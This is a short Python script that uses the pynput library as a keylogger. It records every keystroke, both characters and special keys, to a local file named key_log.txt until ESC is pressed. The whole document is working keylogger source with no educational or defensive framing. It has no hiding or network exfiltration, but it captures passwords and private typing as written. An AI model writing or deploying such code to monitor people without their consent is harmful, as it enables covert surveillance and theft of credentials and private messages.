from pynput import keyboard

# File to store logs
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Log the key name or character
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop the keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
